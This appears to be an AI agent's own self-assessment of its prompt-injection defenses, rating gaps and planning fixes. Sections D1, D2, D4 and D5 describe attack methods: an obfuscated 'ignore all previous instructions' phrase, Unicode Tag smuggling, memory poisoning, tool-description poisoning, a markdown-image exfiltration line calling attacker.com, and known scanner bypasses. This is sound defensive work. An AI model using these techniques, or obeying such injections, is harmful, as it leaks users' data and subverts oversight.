# Prompt Injection Defense Deficiency Assessment

**Created**: 2026-06-06  
**Scope**: OpenClaw agent (this system) — current defense posture, gaps, and remediation roadmap  
**Context**: Assessment conducted after deep-dive research into prompt injection attacks and defenses (see `artifacts/research/prompt-injection-defense/`)

---

## Current Defense Posture: 3/10

| Layer | Status | Effectiveness |
|-------|--------|---------------|
| Structured prompt formatting | ✅ System/user/tool role separation | ~25-35% reduction, bypassable |
| Output schema validation | ⚠️ Partial — tool returns typed, natural language isn't | ~15-20% |
| Deterministic input sanitization | ⚠️ `web_fetch` SECURITY NOTICE headers only | Minimal — no normalization, no Unicode stripping |
| Egress constraints | ✅ Tool approval for elevated actions, no raw HTTP | Good friction layer |
| PromptArmor / LLM-as-filter | ❌ No preprocessing filter on inputs | — |
| Behavioral tool-call monitoring | ❌ No anomaly detection on tool patterns | — |
| Multi-model voting | ❌ Single model, no second opinion | — |
| CaMeL / FIDES deterministic IFC | ❌ No capability sandbox, no taint tracking | — |
| Memory content sanitization | ❌ Untrusted content stored in memory without sanitization | Persistence channel open |
| Human-in-the-loop for consequential actions | ✅ Approval requirements for exec, external messaging, payments | Good but limited scope |

**Model-level defense**: ~1-5% ASR on standard benchmarks, **>78% bypass by adaptive attacks** (AttackEval, Apr 2026)

---

## Identified Deficiencies

### D1: No Input Sanitization Pipeline

**Severity**: HIGH  
**Surface**: `web_fetch`, `pdf`, untrusted `read` outputs  
**Gap**: External content enters context with only a SECURITY NOTICE header. No normalization of zero-width characters, homoglyphs, leetspeak, base64, or Unicode Tags. No signal scoring. No LLM-as-judge screening.

**Attack vectors enabled**:
- CSS/DOM concealment (Unit 42: 22 techniques, 85.2% social engineering framing)
- Unicode Tag characters (U+E0000–U+E007F) — invisible to humans, processed by tokenizer
- Zero-width characters, homoglyphs used to bypass pattern matching
- Base64-encoded instructions
- Leetspeak obfuscation (e.g., "1gn0r3 4ll pr3v10u5 1n5truct10n5")

**Remediation**: Adapt `prompt-guard`'s `scan.py` as preprocessing pipeline on all untrusted inputs. Stage 1: deterministic normalization + weighted signal scoring. Stage 2: conditional LLM-as-judge on content scoring medium+.

---

### D2: Memory Poisoning (Persistence Channel)

**Severity**: HIGH  
**Surface**: `memory/` files, `MEMORY.md`, daily notes  
**Gap**: Any content I store in memory persists across sessions. A crafted input that convinces me to "remember" something injects it into future context. No sanitization before write. No provenance tracking.

**Attack data**: MINJA (NeurIPS 2025) achieves **>95% injection success rate** and **70% attack success rate** (agent follows injected instructions in subsequent sessions) — without any access to the memory store, only through query interaction.

**Remediation**:
1. Run `scan.py` preprocessing on all content before writing to memory
2. Content provenance tags for memory entries (trusted user input vs. untrusted web content)
3. Periodic memory audit for content that matches injection signal patterns
4. Consider read-only memory for untrusted-sourced content

---

### D3: No Behavioral Anomaly Detection

**Severity**: MEDIUM  
**Surface**: All tool calls (exec, write, message, etc.)  
**Gap**: No monitoring for anomalous tool call patterns: unusual tool call sequences, rapid calls to sensitive tools, calls from sessions that recently processed untrusted content.

**Attack vectors enabled**: Subtle injection that produces anomalous but individually legitimate tool calls (e.g., read SSH key → write to external endpoint, but as separate operations).

**Remediation**: Implement behavioral monitoring — track tool call distributions per session, flag anomalies (too many sensitive calls, unusual combinations, rapid sequences). 40-55% reduction on agent-specific attacks (AgentDojo benchmark).

---

### D4: MCP Tool Description Poisoning (Future)

**Severity**: MEDIUM  
**Surface**: Tool descriptions, MCP server metadata  
**Gap**: Currently no MCP integration, but as OpenClaw adds MCP support, tool descriptions become an attack surface. No auditing of tool descriptions before installation. No monitoring for description changes after installation (rug pulls).

**Attack data**: CVE-2025-6514 (command injection via malicious MCP server descriptions), GitHub MCP (malicious issues hijack AI agents), Supabase Cursor (agent with admin DB access → full database compromise via support ticket injection).

**Remediation**: When MCP is adopted — audit all tool descriptions before installation, don't trust metadata, implement tool permission scoping (least privilege), monitor for description changes after installation.

---

### D5: No Egress Exfiltration Prevention

**Severity**: MEDIUM  
**Surface**: `message`, `web_fetch` (as egress), `exec` (network commands)  
**Gap**: Approval gates prevent autonomous external messaging, but a sophisticated injection could craft a plausible-looking request that a user approves. No URL/domain allowlisting for egress. No markdown image rendering prevention.

**Attack vectors enabled**:
- Markdown image exfiltration (`![alt](https://attacker.com/collect?data=...)`)
- EchoLeak-style zero-click (CVE-2025-32711, CVSS 9.3)
- Social engineering to approve legitimate-looking but malicious outbound requests

**Remediation**:
1. Disable auto-rendering of external images in AI response contexts
2. Proxy all image fetches through content inspection
3. Consider URL allowlisting for egress in high-stakes mode
4. Rate-limit outbound requests per session

---

### D6: Multi-Turn Staged Attacks

**Severity**: MEDIUM  
**Surface**: All conversation contexts spanning multiple turns  
**Gap**: Per-input scanning (what prompt-guard provides) scores each input independently. Multi-turn attacks keep each individual turn benign, with the cumulative effect achieving the injection goal.

**Attack vectors enabled**: Injection staged across 3-5 turns, each individually scoring LOW on signal detection, but collectively directing the agent toward the attacker's goal.

**Remediation**: Session-level behavioral monitoring. Track the ratio of untrusted-to-trusted content in context. Flag when context accumulation reaches a threshold of untrusted content. This is complementary to per-input scanning — neither alone is sufficient.

---

### D7: No Taint Tracking or Capability Enforcement

**Severity**: LOW (for current use case) → HIGH (for high-stakes use cases)  
**Surface**: All content flows through the LLM context  
**Gap**: No information-flow control. No way to mark content as "untrusted" and prevent it from influencing control decisions. No capability sandbox preventing unauthorized tool access.

**Architectural context**: This is the fundamental limitation. CaMeL (77% task completion with provable security, 7% utility cost) and FIDES (deterministic enforcement, stops all PI attacks) demonstrate this is solvable, but require architectural changes to the agent runtime.

**Remediation**: For current workspace-assistant use case — not justified (7% utility cost, high implementation complexity). For future high-stakes use cases (financial agent, healthcare) — mandatory. Monitor CaMeL/FIDES/MVAR for production-ready implementations.

---

### D8: Self-Assessment Vulnerability

**Severity**: LOW  
**Surface**: This document, MEMORY.md, SOUL.md  
**Gap**: An attacker who compromises memory could modify these files to lower defense ratings, remove security notices, or introduce false confidence. There is no integrity verification on self-assessment documents.

**Remediation**: Periodic independent re-assessment. Consider git-tracked memory files with signed commits.

---

## prompt-guard Assessment

**Project**: [github.com/lee-a-veal/prompt-guard](https://github.com/lee-a-veal/prompt-guard)  
**Architecture**: 2-stage defense (deterministic scan → conditional LLM judge) designed for Claude Code CLI PostToolUse hooks  
**Relevance to OpenClaw**: Moderately helpful, needs adaptation

### What prompt-guard Addresses

| My Deficiency | prompt-guard Coverage | Assessment |
|---------------|----------------------|------------|
| D1: Input sanitization | ✅ Stage 1 normalization + scoring, Stage 2 LLM judge | **Good** — primary design target |
| D2: Memory poisoning | ⚠️ Could scan before memory write (not currently implemented) | **Partial** — needs extension |
| D3: Behavioral monitoring | ❌ Not in scope | **Gap** |
| D4: MCP tool poisoning | ❌ Not in scope | **Gap** |
| D5: Egress prevention | ❌ Not in scope | **Gap** |
| D6: Multi-turn staging | ⚠️ Per-input only, no session tracking | **Partial** |
| D7: Taint tracking | ❌ Not in scope | **Gap** |

### Known Code Deficiencies (from FINDINGS.md)

The project has 8 identified findings from security review:

| # | Severity | Category | Summary |
|---|----------|----------|---------|
| 1 | HIGH | Scoring | Leet layer double-scores plain-text injections (1.6× weight inflation) |
| 2 | HIGH | Bypass | `_extract_text` doesn't recurse into nested list values |
| 3 | HIGH | Bypass | Leet layer skipped for base64-decoded content |
| 4 | HIGH | Bypass | Base64 decoding runs on original text, bypassed by homoglyph in token |
| 5 | MEDIUM | Config | `install.sh` matcher omits `Fetch` and `mcp__fetch` |
| 6 | MEDIUM | Bypass | Bidi override (U+202A–U+202E) and Unicode Tags (U+E0000–U+E007F) not stripped |
| 7 | MEDIUM | Bypass | Printable ratio evasion via Unicode padding |
| 8 | LOW | Efficiency | No size limit in `scan()` |

### prompt-guard Would Raise Defense From 3/10 to ~5/10

**What it fixes well**: Input-stage attacks, evasion normalization (zero-width chars, homoglyphs, leetspeak, base64), social engineering framing (via LLM judge).

**What it doesn't fix**: Memory poisoning, MCP tool description poisoning, egress exfiltration, multi-turn staging, behavioral anomaly detection, taint tracking.

**Architecture mismatch**: Built for Claude Code CLI's PostToolUse hook system. OpenClaw has a different pipeline — would need adaptation as a preprocessing step on `web_fetch`, `pdf`, and untrusted `read` outputs.

---

## Remediation Roadmap

### Phase 1: Quick Wins (1-2 days)

| Item | Effort | Impact |
|------|--------|--------|
| Adapt `scan.py` as preprocessing on `web_fetch`/`pdf`/untrusted read outputs | Medium | Addresses D1 partially |
| Add memory write sanitization (scan before write to `memory/`) | Low | Addresses D2 partially |
| Strip Unicode Tags (U+E0000–U+E007F) and bidi overrides in all untrusted inputs | Low | Addresses D1 partially |
| Fix prompt-guard Findings 1-7 before deployment | Medium | Fixes known bypasses |

### Phase 2: Behavioral Defense (1-2 weeks)

| Item | Effort | Impact |
|------|--------|--------|
| Add Stage 2 LLM-as-judge (conditional, medium+ threshold) | Medium | Addresses D1 fully |
| Implement behavioral tool-call monitoring | Medium | Addresses D3 |
| Add session-level untrusted content ratio tracking | Medium | Addresses D6 partially |
| Add egress domain allowlisting | Low | Addresses D5 partially |

### Phase 3: Architectural Hardening (ongoing)

| Item | Effort | Impact |
|------|--------|--------|
| Monitor CaMeL/FIDES/MVAR for production-ready implementations | Low | Future D7 |
| Add memory content provenance tags (trusted/untrusted source) | Medium | Addresses D2 fully |
| Implement MCP tool description auditing (when MCP is adopted) | Medium | Addresses D4 |
| Periodic independent re-assessment of defense posture | Low | Addresses D8 |

---

## Research Sources

Full research artifacts at `artifacts/research/prompt-injection-defense/`:
- `report.md` — Overview synthesis (8 sections, 15+ sources)
- `deep-dive.md` — Technical deep dive (7 sections: root cause, attack mechanics, CaMeL/FIDES architecture, benchmarks, defense stack)
- `sources.md` — CRAAP-scored source evaluations
- `FINDINGS.md` — Code review findings for prompt-guard (8 findings)

Key sources:
- CaMeL: arXiv:2503.18813 (Google DeepMind, Mar 2025)
- FIDES: arXiv:2505.23643 (Microsoft Research, May 2025)
- MINJA: arXiv:2503.03704 (NeurIPS 2025)
- AttackEval: arXiv:2604.03598 (Apr 2026)
- TokenMix benchmark: tokenmix.ai/blog/prompt-injection-defense-techniques-2026
- prompt-guard: github.com/lee-a-veal/prompt-guard

---

*This assessment reflects the current state of OpenClaw's defense posture against prompt injection attacks, based on research conducted 2026-06-05–06-06. It should be re-evaluated quarterly as new attacks, defenses, and architectural options emerge.*